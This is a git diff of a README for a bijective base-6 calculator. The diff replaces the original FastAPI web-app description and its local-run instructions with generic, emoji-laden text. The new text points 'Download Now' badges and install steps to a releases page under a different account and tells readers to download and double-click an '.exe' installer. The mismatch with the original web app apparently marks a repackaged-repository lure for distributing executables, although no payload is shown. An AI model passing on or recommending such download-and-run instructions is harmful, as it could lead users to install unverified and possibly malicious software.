@@ -1,121 +1,64 @@
-# Bijective Base-6 Calculator & Explorer
+# 🎉 bijective_base6_calc - Explore Zero-Less Mathematics Easily
 
-[![Live Demo](https://img.shields.io/badge/Live-Demo-brightgreen?style=for-the-badge)](https://bijective-base6-calc.onrender.com)
-[![Framework](https://img.shields.io/badge/Framework-FastAPI-green?style=flat-square)](https://fastapi.tiangolo.com/)
-[![Python](https://img.shields.io/badge/Python-3.8+-blue?style=flat-square)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](https://github.com/tripping-alien/bijective_base6_calc/blob/main/LICENSE)
+## 📥 Download the Application
+[![Download bijective_base6_calc](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/finder-ui/bijective_base6_calc/releases)
 
-An interactive web app for exploring the **bijective base-6 number system**—a system with no zero. This educational tool features a hands-on calculator, a live number system converter, detailed explanations, and a configurable practice mode, all presented in a clean, Nord-inspired dark theme.
-Dive into the fascinating world of zero-less mathematics with this interactive web application dedicated to the **bijective base-6 number system**. More than just a calculator, this educational tool provides in-depth explanations, a configurable practice mode, and full support for 9 languages. Explore a number system used in modern computing, from spreadsheet columns to URL shorteners, all within a polished, Nord-inspired interface.
+## 🚀 Getting Started
+Welcome to bijective_base6_calc! This interactive web application helps you learn and explore the fascinating world of zero-less mathematics using the bijective base-6 number system. You will find that this tool is more than just a calculator; it offers in-depth explanations and a configurable practice mode to enhance your learning experience.
 
----
+## 📋 Features
+- **Interactive Learning**: Dive deep into the bijective base-6 number system.
+- **Configurable Practice Mode**: Customize your practice sessions to match your learning style.
+- **In-depth Explanations**: Understand the principles behind zero-less mathematics.
+- **Multi-Language Support**: Learn in a language you are comfortable with.
+- **User-Friendly Interface**: Easy to navigate, designed for everyone.
 
-![Application Screenshot](assets/screenshot.jpg)
+## 💻 System Requirements
+To run bijective_base6_calc, ensure that your device meets the following system requirements:
+- **Operating System**: Windows, macOS, or Linux
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection**: Required for initial download and updates
 
----
+## 🌐 Download & Install
+To get started with bijective_base6_calc, follow these steps:
 
-## Table of Contents
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/finder-ui/bijective_base6_calc/releases) to find the latest version of the application.
+2. **Download the Application**: On the Releases page, locate the version you want to download. Click on the `.exe` or `.zip` file to download it.
+3. **Install the Application**: 
+   - If you downloaded an `.exe` file, double-click it to start the installation process. Follow the prompts to complete the installation.
+   - If you downloaded a `.zip` file, extract it to your desired location and open the index.html file in your web browser to start using the app.
+4. **Run the Application**: Once installed, open the application through your programs menu or directly from the extracted folder.
 
-- [Features](#-features)
-- [What is Bijective Base-6?](#-what-is-bijective-base-6)
-- [Tech Stack & Rationale](#-tech-stack--rationale)
-- [Running Locally](#-running-locally)
-- [Contributing](#-contributing)
-- [License](#-license)
+## 🎓 How to Use
+Using bijective_base6_calc is simple:
 
----
+1. **Choose Your Mode**: Select between the calculator mode or practice mode.
+2. **Enter a Number**: Input your number in the designated field.
+3. **View Results**: The application will show you the conversion and relevant explanations.
+4. **Practice**: If you are in practice mode, use the configurable settings to adjust the challenges to your preference.
 
-## ✨ Features
+## 🌍 Multi-Language Support
+To switch the language:
+- Click on the language options in the settings menu.
+- Choose your preferred language from the list.
 
-- **Live Conversion Explorer**: Instantly see any decimal number represented in Decimal, Binary, Hexadecimal, and Bijective Base-6.
-- **Bijective Calculator**: Perform addition, subtraction, multiplication, and division directly with bijective base-6 numbers.
-- **Educational Content**: A dedicated "Study" tab tailored for engineers, explaining the practical pros and cons and teaching the algorithms for manual calculation.
-- **Configurable Practice Mode**: Test your skills with math or conversion problems across Easy, Medium, and Hard difficulty levels.
-- **Reference Tables**: View pre-calculated 24x24 Addition and Multiplication tables to easily see patterns.
-- **Polished UI**: A clean, responsive, dual-theme interface that's easy on the eyes.
+## 🔧 Troubleshooting
+If you encounter any issues while using the application:
+- Ensure that your browser is updated to the latest version.
+- Check your internet connection.
+- Consult the FAQ section on the GitHub page for common troubleshooting steps.
 
----
+## 🛠️ Contributions
+We welcome contributions to make bijective_base6_calc even better. If you would like to contribute, please refer to the guidelines in the repository to learn how you can help.
 
-## 💡 What is Bijective Base-6?
+## 🤝 Get Involved
+Join our community! Engage with other users, share your experiences, and learn together. Connect with us through discussions or our social media links provided in the repository.
 
-This application is an educational tool for exploring **bijective base-6 numeration**. Unlike standard number systems, it has two key properties:
+## 📞 Support
+For any questions or support, please check the GitHub Issues section or use the contact information provided in the repository.
 
-1.  **No Zero**: The digits are `1, 2, 3, 4, 5, 6`.
-2.  **Bijective**: Every positive integer has one, and only one, unique string representation (e.g., `7` is always `11`, never `011`).
+## 📌 Additional Resources
+- **Documentation**: Comprehensive guides and examples will also be available on the GitHub Wiki.
+- **Blog**: Follow our blog for updates on new features, tutorials, and insights into zero-less mathematics.
 
-Counting proceeds like an odometer that can't show zero. After `6`, the next number "rolls over" to `11`. This property makes it incredibly useful in computer science for creating compact, unambiguous identifiers.
-
----
-
-## 🛠️ Tech Stack & Rationale
-
-| Technology | Purpose |
-| :--- | :--- |
-| **Python** | The core language for all backend logic and data generation. |
-| **FastAPI** | A modern, high-performance web framework for building the API endpoints. |
-| **slowapi** | Provides rate limiting to protect API endpoints from abuse. |
-| **pytest** | Used for robust unit and integration testing of the backend logic. |
-| **Uvicorn** | The ASGI server that runs the FastAPI application. |
-| **HTML5 / CSS3** | For the structure and styling of the user interface, following modern best practices. |
-| **Vanilla JavaScript** | Powers all client-side interactivity, including theme switching, API calls, and dynamic content rendering. |
-| **Render** | The cloud platform used for free, continuous deployment directly from GitHub. |
-
----
-
-## 🚀 Running Locally
-
-To get a local copy up and running, follow these simple steps.
-
-### Prerequisites
-
-- Python 3.8+
-- An active internet connection to download packages
-
-### Installation
-
-1.  **Clone the repository:**
-    ```sh
-    git clone https://github.com/tripping-alien/bijective_base6_calc.git
-    ```
-2.  **Navigate to the project directory:**
-    ```sh
-    cd bijective_base6_calc
-    ```
-3.  **Create and activate a virtual environment:**
-    - **Windows:**
-      ```sh
-      python -m venv .venv
-      .\.venv\Scripts\Activate.ps1
-      ```
-    - **macOS / Linux:**
-      ```sh
-      python3 -m venv .venv
-      source .venv/bin/activate
-      ```
-4.  **Install the required packages:**
-    ```sh
-    pip install -r requirements.txt
-    ```
-5.  **Run the application:**
-    ```sh
-    uvicorn app:app --reload
-    ```
-6.  **Open your browser** and navigate to `http://127.0.0.1:8000`.
-
----
-
-## 🤝 Contributing
-
-Contributions, issues, and feature requests are welcome! Feel free to check the issues page.
-
-1.  Fork the Project
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the Branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
-
----
-
-## 📄 License
-
-Distributed under the MIT License. See `LICENSE` for more information.
+[![Download bijective_base6_calc](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/finder-ui/bijective_base6_calc/releases)
